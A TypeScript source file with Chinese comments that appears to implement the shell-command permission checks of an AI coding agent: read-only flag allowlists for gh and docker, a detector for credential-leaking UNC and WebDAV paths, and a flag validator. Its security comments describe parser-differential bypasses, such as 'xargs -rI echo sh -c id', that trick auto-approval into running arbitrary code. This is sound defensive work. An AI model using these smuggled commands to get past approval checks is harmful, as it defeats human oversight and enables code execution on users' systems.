    safeFlags: {
      '--json': 'string',
      '--comments': 'none',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue list 是只读——列出 issue
  'gh issue list': {
    safeFlags: {
      '--state': 'string',
      '-s': 'string',
      '--assignee': 'string',
      '--author': 'string',
      '--label': 'string',
      '--limit': 'number',
      '-L': 'number',
      '--milestone': 'string',
      '--search': 'string',
      '--json': 'string',
      '--app': 'string',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh repo view 是只读——显示仓库详情
  // 注意:gh repo view 使用位置参数,而不是 --repo/-R 旗标
  'gh repo view': {
    safeFlags: {
      '--json': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh run list 是只读——列出 workflow run
  'gh run list': {
    safeFlags: {
      '--branch': 'string', // 按分支过滤
      '-b': 'string',
      '--status': 'string', // 按状态过滤
      '-s': 'string',
      '--workflow': 'string', // 按 workflow 过滤
      '-w': 'string', // 注意:这里 -w 是 --workflow,不是 --web(gh run list 没有 --web)
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
      '--event': 'string', // 按事件类型过滤
      '-e': 'string',
      '--user': 'string', // 按用户过滤
      '-u': 'string',
      '--created': 'string', // 按创建日期过滤
      '--commit': 'string', // 按提交 SHA 过滤
      '-c': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh run view 是只读——显示某个 workflow run 的详情
  'gh run view': {
    safeFlags: {
      '--log': 'none', // 显示完整 run 日志
      '--log-failed': 'none', // 只显示失败步骤的日志
      '--exit-status': 'none', // 以 run 的状态码退出
      '--verbose': 'none', // 显示 job 步骤
      '-v': 'none', // 注意:这里 -v 是 --verbose,不是 --web
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
      '--job': 'string', // 按 ID 查看指定 job
      '-j': 'string',
      '--attempt': 'number', // 查看指定 attempt
      '-a': 'number',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh auth status 是只读——显示认证状态
  // 注意:--show-token/-t 被刻意排除(会泄露秘密)
  'gh auth status': {
    safeFlags: {
      '--active': 'none', // 只显示活动账号
      '-a': 'none',
      '--hostname': 'string', // 检查指定主机名
      '-h': 'string',
      '--json': 'string', // JSON 字段选择
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr status 是只读——显示你的 PR
  'gh pr status': {
    safeFlags: {
      '--conflict-status': 'none', // 显示合并冲突状态
      '-c': 'none',
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue status 是只读——显示你的 issue
  'gh issue status': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh release list 是只读——列出 release
  'gh release list': {
    safeFlags: {
      '--exclude-drafts': 'none', // 排除草稿 release
      '--exclude-pre-releases': 'none', // 排除预发布
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--order': 'string', // 排序:asc|desc
      '-O': 'string',
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh release view 是只读——显示 release 详情
  // 注意:--web/-w 被刻意排除(会打开浏览器)
  'gh release view': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh workflow list 是只读——列出 workflow 文件
  'gh workflow list': {
    safeFlags: {
      '--all': 'none', // 含已禁用的 workflow
      '-a': 'none',
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh workflow view 是只读——显示 workflow 摘要
  // 注意:--web/-w 被刻意排除(会打开浏览器)
  'gh workflow view': {
    safeFlags: {
      '--ref': 'string', // 指定 workflow 版本所在的分支/tag
      '-r': 'string',
      '--yaml': 'none', // 查看 workflow yaml
      '-y': 'none',
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh label list 是只读——列出 label
  // 注意:--web/-w 被刻意排除(会打开浏览器)
  'gh label list': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--order': 'string', // 排序:created|name
      '--search': 'string', // 搜索 label 名
      '-S': 'string',
      '--sort': 'string', // 排序:created|name
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh search repos 是只读——搜索仓库
  // 注意:--web/-w 被刻意排除(会打开浏览器)
  'gh search repos': {
    safeFlags: {
      '--archived': 'none', // 按归档状态过滤
      '--created': 'string', // 按创建日期过滤
      '--followers': 'string', // 按 followers 数过滤
      '--forks': 'string', // 按 forks 数过滤
      '--good-first-issues': 'string', // 按 good first issues 数过滤
      '--help-wanted-issues': 'string', // 按 help wanted issues 数过滤
      '--include-forks': 'string', // 包含 fork:false|true|only
      '--json': 'string', // JSON 字段选择
      '--language': 'string', // 按语言过滤
      '--license': 'string', // 按许可证过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--match': 'string', // 限定字段:name|description|readme
      '--number-topics': 'string', // 按 topic 数过滤
      '--order': 'string', // 排序:asc|desc
      '--owner': 'string', // 按 owner 过滤
      '--size': 'string', // 按体积范围过滤
      '--sort': 'string', // 排序:forks|help-wanted-issues|stars|updated
      '--stars': 'string', // 按 stars 过滤
      '--topic': 'string', // 按 topic 过滤
      '--updated': 'string', // 按更新日期过滤
      '--visibility': 'string', // 过滤:public|private|internal
    },
  },
  // gh search issues 是只读——搜索 issue
  // 注意:--web/-w 被刻意排除(会打开浏览器)
  'gh search issues': {
    safeFlags: {
      '--app': 'string', // 按 GitHub App 作者过滤
      '--assignee': 'string', // 按 assignee 过滤
      '--author': 'string', // 按作者过滤
      '--closed': 'string', // 按关闭日期过滤
      '--commenter': 'string', // 按评论者过滤
      '--comments': 'string', // 按评论数过滤
      '--created': 'string', // 按创建日期过滤
      '--include-prs': 'none', // 结果中包含 PR
      '--interactions': 'string', // 按互动数过滤
      '--involves': 'string', // 按涉及用户过滤
      '--json': 'string', // JSON 字段选择
      '--label': 'string', // 按 label 过滤
      '--language': 'string', // 按语言过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--locked': 'none', // 过滤锁定的会话
      '--match': 'string', // 限定字段:title|body|comments
      '--mentions': 'string', // 按提及用户过滤
      '--milestone': 'string', // 按 milestone 过滤
      '--no-assignee': 'none', // 过滤无 assignee
      '--no-label': 'none', // 过滤无 label
      '--no-milestone': 'none', // 过滤无 milestone
      '--no-project': 'none', // 过滤无 project
      '--order': 'string', // 排序:asc|desc
      '--owner': 'string', // 按 owner 过滤
      '--project': 'string', // 按 project 过滤
      '--reactions': 'string', // 按 reaction 数过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--sort': 'string', // 排序字段
      '--state': 'string', // 过滤:open|closed
      '--team-mentions': 'string', // 按团队提及过滤
      '--updated': 'string', // 按更新日期过滤
      '--visibility': 'string', // 过滤:public|private|internal
    },
  },
  // gh search prs 是只读——搜索 PR
  // 注意:--web/-w 被刻意排除(会打开浏览器)
  'gh search prs': {
    safeFlags: {
      '--app': 'string', // 按 GitHub App 作者过滤
      '--assignee': 'string', // 按 assignee 过滤
      '--author': 'string', // 按作者过滤
      '--base': 'string', // 按 base 分支过滤
      '-B': 'string',
      '--checks': 'string', // 按检查状态过滤
      '--closed': 'string', // 按关闭日期过滤
      '--commenter': 'string', // 按评论者过滤
      '--comments': 'string', // 按评论数过滤
      '--created': 'string', // 按创建日期过滤
      '--draft': 'none', // 过滤草稿 PR
      '--head': 'string', // 按 head 分支过滤
      '-H': 'string',
      '--interactions': 'string', // 按互动数过滤
      '--involves': 'string', // 按涉及用户过滤
      '--json': 'string', // JSON 字段选择
      '--label': 'string', // 按 label 过滤
      '--language': 'string', // 按语言过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--locked': 'none', // 过滤锁定的会话
      '--match': 'string', // 限定字段:title|body|comments
      '--mentions': 'string', // 按提及用户过滤
      '--merged': 'none', // 过滤已合并 PR
      '--merged-at': 'string', // 按合并日期过滤
      '--milestone': 'string', // 按 milestone 过滤
      '--no-assignee': 'none', // 过滤无 assignee
      '--no-label': 'none', // 过滤无 label
      '--no-milestone': 'none', // 过滤无 milestone
      '--no-project': 'none', // 过滤无 project
      '--order': 'string', // 排序:asc|desc
      '--owner': 'string', // 按 owner 过滤
      '--project': 'string', // 按 project 过滤
      '--reactions': 'string', // 按 reaction 数过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--review': 'string', // 按 review 状态过滤
      '--review-requested': 'string', // 按请求 review 过滤
      '--reviewed-by': 'string', // 按 reviewer 过滤
      '--sort': 'string', // 排序字段
      '--state': 'string', // 过滤:open|closed
      '--team-mentions': 'string', // 按团队提及过滤
      '--updated': 'string', // 按更新日期过滤
      '--visibility': 'string', // 过滤:public|private|internal
    },
  },
  // gh search commits 是只读——搜索提交
  // 注意:--web/-w 被刻意排除(会打开浏览器)
  'gh search commits': {
    safeFlags: {
      '--author': 'string', // 按作者过滤
      '--author-date': 'string', // 按 authored 日期过滤
      '--author-email': 'string', // 按作者邮箱过滤
      '--author-name': 'string', // 按作者名过滤
      '--committer': 'string', // 按 committer 过滤
      '--committer-date': 'string', // 按 committed 日期过滤
      '--committer-email': 'string', // 按 committer 邮箱过滤
      '--committer-name': 'string', // 按 committer 名过滤
      '--hash': 'string', // 按提交 hash 过滤
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--merge': 'none', // 过滤合并提交
      '--order': 'string', // 排序:asc|desc
      '--owner': 'string', // 按 owner 过滤
      '--parent': 'string', // 按 parent hash 过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--sort': 'string', // 排序:author-date|committer-date
      '--tree': 'string', // 按 tree hash 过滤
      '--visibility': 'string', // 过滤:public|private|internal
    },
  },
  // gh search code 是只读——搜索代码
  // 注意:--web/-w 被刻意排除(会打开浏览器)
  'gh search code': {
    safeFlags: {
      '--extension': 'string', // 按文件扩展名过滤
      '--filename': 'string', // 按文件名过滤
      '--json': 'string', // JSON 字段选择
      '--language': 'string', // 按语言过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--match': 'string', // 限定:file|path
      '--owner': 'string', // 按 owner 过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--size': 'string', // 按体积范围过滤
    },
  },
};

// ---------------------------------------------------------------------------
// DOCKER_READ_ONLY_COMMANDS —— docker inspect/logs 只读命令
// ---------------------------------------------------------------------------

export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
  {
    'docker logs': {
      safeFlags: {
        '--follow': 'none',
        '-f': 'none',
        '--tail': 'string',
        '-n': 'string',
        '--timestamps': 'none',
        '-t': 'none',
        '--since': 'string',
        '--until': 'string',
        '--details': 'none',
      },
    },
    'docker inspect': {
      safeFlags: {
        '--format': 'string',
        '-f': 'string',
        '--type': 'string',
        '--size': 'none',
        '-s': 'none',
      },
    },
  };

// ---------------------------------------------------------------------------
// EXTERNAL_READONLY_COMMANDS —— 跨 shell 的只读命令
// 只收在 bash 与 Windows PowerShell 中行为一致的命令。
// Unix 专有命令(cat、head、wc 等)属于 BashTool 的 READONLY_COMMANDS。
// ---------------------------------------------------------------------------

export const EXTERNAL_READONLY_COMMANDS: readonly string[] = [
  // 跨平台外部工具,在 bash 与 Windows PowerShell 中行为一致
  'docker ps',
  'docker images',
] as const;

// ---------------------------------------------------------------------------
// UNC 路径检测(Bash 与 PowerShell 共用)
// ---------------------------------------------------------------------------

/**
 * 检查路径或命令是否含有可能触发网络请求的 UNC 路径
 * (NTLM/Kerberos 凭据泄露、WebDAV 攻击)。
 *
 * 本函数检测:
 * - 基本 UNC 路径:\\server\share、\\foo.com\file
 * - WebDAV 模式:\\server@SSL@8443\、\\server@8443@SSL\、\\server\DavWWWRoot\
 * - 基于 IP 的 UNC:\\192.168.1.1\share、\\[2001:db8::1]\share
 * - 正斜杠变体://server/share
 *
 * @param pathOrCommand 待检查的路径或命令字符串
 * @returns 含有潜在危险 UNC 路径时返回 true
 */
export function containsVulnerableUncPath(pathOrCommand: string): boolean {
  // 仅在 Windows 平台检查
  if (process.platform !== 'win32') {
    return false;
  }

  // 1. 检查反斜杠的一般 UNC 路径
  // 模式匹配:\\server、\\server\share、\\server/share、\\server@port\share
  // 主机名用 [^\s\\/]+ 以兜住 Unicode 同形字符与其他非 ASCII 字符
  // 结尾同时接受 \ 和 /,因为 Windows 把两者都当作路径分隔符
  const backslashUncPattern = /\\\\[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i;
  if (backslashUncPattern.test(pathOrCommand)) {
    return true;
  }

  // 2. 检查正斜杠 UNC 路径
  // 模式匹配://server、//server/share、//server\share、//192.168.1.1/share
  // 用否定后顾 (?<!:) 排除 URL(https://、http://、ftp://),
  // 同时兜住前面是引号、= 或任何其他非冒号字符的 //。
  // 结尾同时接受 / 和 \,因为 Windows 把两者都当作路径分隔符。
  // (原文此处有 eslint-disable 注释:对短命令字符串做 .test(),允许 lookbehind)
  const forwardSlashUncPattern =
    /(?<!:)\/\/[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i;
  if (forwardSlashUncPattern.test(pathOrCommand)) {
    return true;
  }

  // 3. 检查混合分隔符 UNC 路径(正斜杠 + 反斜杠)
  // 在 Windows/Cygwin 上,/\ 等价于 //,两者都是路径分隔符。
  // 在 bash 中,/\\server 经转义处理后变成 /\server,即 UNC 路径。
  // 要求 / 后有 2+ 个反斜杠,因为单个反斜杠只是转义下一个字符
  // (如 /\a 经 bash 处理后是 /a,不是 UNC 路径)。
  const mixedSlashUncPattern = /\/\\{2,}[^\s\\/]/;
  if (mixedSlashUncPattern.test(pathOrCommand)) {
    return true;
  }

  // 4. 检查混合分隔符 UNC 路径(反斜杠 + 正斜杠)
  // bash 中 \\/server 经转义处理后变成 \/server,在 Windows 上是 UNC 路径,
  // 因为 \ 和 / 都是路径分隔符。
  const reverseMixedSlashUncPattern = /\\{2,}\/[^\s\\/]/;
  if (reverseMixedSlashUncPattern.test(pathOrCommand)) {
    return true;
  }

  // 5. 检查 WebDAV SSL/端口模式
  // 例:\\server@SSL@8443\path、\\server@8443@SSL\path
  if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) {
    return true;
  }

  // 6. 检查 DavWWWRoot 标记(Windows WebDAV 重定向器)
  // 例:\\server\DavWWWRoot\path
  if (/DavWWWRoot/i.test(pathOrCommand)) {
    return true;
  }

  // 7. 检查带 IPv4 地址的 UNC 路径(显式检查,纵深防御)
  // 例:\\192.168.1.1\share、\\10.0.0.1\path
  if (
    /^\\\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand) ||
    /^\/\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand)
  ) {
    return true;
  }

  // 8. 检查带方括号 IPv6 地址的 UNC 路径(显式检查,纵深防御)
  // 例:\\[2001:db8::1]\share、\\[::1]\path
  if (
    /^\\\\(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand) ||
    /^\/\/(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand)
  ) {
    return true;
  }

  return false;
}

// ---------------------------------------------------------------------------
// 旗标验证工具
// ---------------------------------------------------------------------------

// 匹配合法旗标名的正则(字母、数字、下划线、连字符)
export const FLAG_PATTERN = /^-[a-zA-Z0-9_-]/;

/**
 * 按期望类型校验旗标参数
 */
export function validateFlagArgument(
  value: string,
  argType: FlagArgType,
): boolean {
  switch (argType) {
    case 'none':
      return false; // 'none' 类型本不应调用此函数
    case 'number':
      return /^\d+$/.test(value);
    case 'string':
      return true; // 任意字符串(含空串)都合法
    case 'char':
      return value.length === 1;
    case '{}':
      return value === '{}';
    case 'EOF':
      return value === 'EOF';
    default:
      return false;
  }
}

/**
 * 按配置校验已分词命令的旗标/参数部分。
 * 这是从 BashTool 的 isCommandSafeViaFlagParsing 提取出的旗标遍历循环。
 *
 * @param tokens - 预分词参数(来自 bash shell-quote 或 PowerShell AST)
 * @param startIndex - 开始校验的位置(命令 token 之后)
 * @param config - 安全旗标配置
 * @param options.commandName - 用于命令特定处理(git 数字简写、grep/rg 附加数字)
 * @param options.rawCommand - 供 additionalCommandIsDangerousCallback 使用
 * @param options.xargsTargetCommands - 提供时启用 xargs 式目标命令检测
 * @returns 所有旗标合法返回 true,否则 false
 */
export function validateFlags(
  tokens: string[],
  startIndex: number,
  config: ExternalCommandConfig,
  options?: {
    commandName?: string;
    rawCommand?: string;
    xargsTargetCommands?: string[];
  },
): boolean {
  let i = startIndex;

  while (i < tokens.length) {
    let token = tokens[i];
    if (!token) {
      i++;
      continue;
    }

    // xargs 特殊处理:一旦找到目标命令,停止校验旗标
    if (
      options?.xargsTargetCommands &&
      options.commandName === 'xargs' &&
      (!token.startsWith('-') || token === '--')
    ) {
      if (token === '--' && i + 1 < tokens.length) {
        i++;
        token = tokens[i];
      }
      if (token && options.xargsTargetCommands.includes(token)) {
        break;
      }
      return false;
    }

    if (token === '--') {
      // 安全:仅当该工具遵守 POSIX `--` 时才 break(默认:true)。
      // pyright 这类工具不遵守 `--`——它们把 `--` 当文件路径,并继续把后续
      // token 当旗标处理。在这里 break 会让 `pyright -- --createstub os`
      // 自动批准一个文件写旗标。
      if (config.respectsDoubleDash !== false) {
        i++;
        break; // `--` 之后都是参数
      }
      // 工具不遵守 `--`:按位置参数处理,继续校验
      i++;
      continue;
    }

    if (token.startsWith('-') && token.length > 1 && FLAG_PATTERN.test(token)) {
      // 处理 --flag=value 形式
      // 安全:把 token 是否含 `=` 与值是否非空分开跟踪。`-E=` 的
      // hasEquals=true 但 inlineValue=''(falsy)。没有 hasEquals,
      // 下方的 falsy 检查会落到"消费下一个 token"——但 GNU getopt 对
      // 必填参数的短选项把 `-E=` 看作 `-E` 加附加参数 `=`(它不为短选项
      // 剥 `=`)。解析差异:校验器前进 2 个 token,GNU 前进 1 个。
      //
      // 攻击:`xargs -E= EOF echo foo`(零权限)
      //   校验器:inlineValue='' 为 falsy → 把 EOF 当作 -E 的参数 → i+=2 →
      //     echo ∈ SAFE_TARGET_COMMANDS_FOR_XARGS → break → 自动放行
      //   GNU xargs:-E 的附加参数是 `=` → EOF 成为目标命令 → 代码执行
      //
      // 修复:hasEquals 为 true 时,把 inlineValue(即使为空)作为已提供的
      // 参数。validateFlagArgument('', 'EOF') → false → 拒绝。
      // 这对所有参数类型都正确:用户显式敲了 `=`,表示提供了(空)值。
      // 不要再消费下一个 token。
      const hasEquals = token.includes('=');
      const [flag, ...valueParts] = token.split('=');
      const inlineValue = valueParts.join('=');

      if (!flag) {
        return false;
      }

      const flagArgType = config.safeFlags[flag];

      if (!flagArgType) {
        // 特例:git 命令支持 -<number> 作为 -n <number> 的简写
        if (options?.commandName === 'git' && flag.match(/^-\d+$/)) {
          // 这等价于 -n 旗标,对 git log/diff/show 是安全的
          i++;
          continue;
        }

        // 处理直接附加数字参数的旗标(如 -A20、-B10)
        // 仅对 grep 与 rg 命令应用此特殊处理
        if (
          (options?.commandName === 'grep' || options?.commandName === 'rg') &&
          flag.startsWith('-') &&
          !flag.startsWith('--') &&
          flag.length > 2
        ) {
          const potentialFlag = flag.substring(0, 2); // 如 '-A20' 中的 '-A'
          const potentialValue = flag.substring(2); // 如 '-A20' 中的 '20'

          if (config.safeFlags[potentialFlag] && /^\d+$/.test(potentialValue)) {
            // 这是带附加数字参数的旗标
            const flagArgType = config.safeFlags[potentialFlag];
            if (flagArgType === 'number' || flagArgType === 'string') {
              // 校验数字值
              if (validateFlagArgument(potentialValue, flagArgType)) {
                i++;
                continue;
              } else {
                return false; // 附加参数非法
              }
            }
          }
        }

        // 处理组合单字母旗标,如 -nr
        // 安全:不允许任何带参数的捆绑旗标。GNU getopt 捆绑语义:当带参
        // 选项出现在捆绑末尾且后面没有字符时,下一个 argv 元素会被消费为
        // 它的参数。因此 `xargs -rI echo sh -c id` 被 xargs 解析为:
        //   -r(无参)+ -I 的 replace-str=`echo`,目标命令=`sh -c id`
        // 之前的天真实现只检查是否存在于 safeFlags(`-r: 'none'` 与
        // `-I: '{}'` 都是 truthy),然后 `i++` 只消费一个 token。这造成
        // 解析差异:校验器以为 `echo` 是 xargs 目标(在
        // SAFE_TARGET_COMMANDS_FOR_XARGS 中 → break),但 xargs 实际运行
        // `sh -c id`。仅凭 Bash(echo:*) 或更低权限即可任意 RCE。
        //
        // 修复:要求所有被捆绑的旗标参数类型都是 'none'。捆绑中任何旗标
        // 需要参数(非 'none' 类型)就拒绝整个捆绑。这是保守做法——会整个
        // 拦掉 `-rI`(xargs),但这是安全方向。需要 `-I` 的用户可以不捆绑:
        // `-r -I {}`。
        if (flag.startsWith('-') && !flag.startsWith('--') && flag.length > 2) {
          for (let j = 1; j < flag.length; j++) {
            const singleFlag = '-' + flag[j];
            const flagType = config.safeFlags[singleFlag];
            if (!flagType) {
              return false; // 组合中有一个旗标不安全
            }
            // 安全:捆绑旗标必须是无参类型。捆绑中带参数的旗标在 GNU
            // getopt 下会消费下一个 token,而我们的实现没有建模这一点。
            // 拒绝以避免解析差异。
            if (flagType !== 'none') {
              return false; // 捆绑中带参数的旗标——无法安全校验
            }
          }
          i++;
          continue;
        } else {
          return false; // 未知旗标
        }
      }

      // 校验旗标参数
      if (flagArgType === 'none') {
        // 安全:hasEquals 覆盖 `-FLAG=`(空内联值)。没有它,'none' 类型的
        // `-FLAG=` 会被放行(inlineValue='' 是 falsy)。
        if (hasEquals) {
          return false; // 旗标不应带值
        }
        i++;
      } else {
        let argValue: string;
        // 安全:用 hasEquals(而不是 inlineValue 真假)。`-E=` 不得消费下
        // 一个 token——用户显式提供了空值。
        if (hasEquals) {
          argValue = inlineValue;
          i++;
        } else {
          // 检查下一个 token 是否为参数
          if (
            i + 1 >= tokens.length ||
            (tokens[i + 1] &&
              tokens[i + 1]!.startsWith('-') &&
              tokens[i + 1]!.length > 1 &&
              FLAG_PATTERN.test(tokens[i + 1]!))
          ) {
            return false; // 缺少必填参数
          }
          argValue = tokens[i + 1] || '';
          i += 2;
        }

        // 纵深防御:对字符串参数,拒绝以 '-' 开头的值。
        // 防止类型混淆攻击:某旗标标为 'string' 但实际不带参数时,可能被
        // 用来注入危险旗标。
        // 例外:git 的 --sort 旗标允许 '-' 开头的值用于反向排序。
        if (flagArgType === 'string' && argValue.startsWith('-')) {
          // 特例:git 的 --sort 旗标允许 - 前缀做反向排序
          if (
            flag === '--sort' &&
            options?.commandName === 'git' &&
            argValue.match(/^-[a-zA-Z]/)
          ) {
            // 看起来像反向排序(如 -refname、-version:refname)
            // 其余部分像合法排序 key 就放行
          } else {
            return false;
          }
        }

        // 按类型校验参数
        if (!validateFlagArgument(argValue, flagArgType)) {
          return false;
        }
      }
    } else {
      // 非旗标参数(如修订规格、文件路径等)——允许
      i++;
    }
  }

  return true;
}
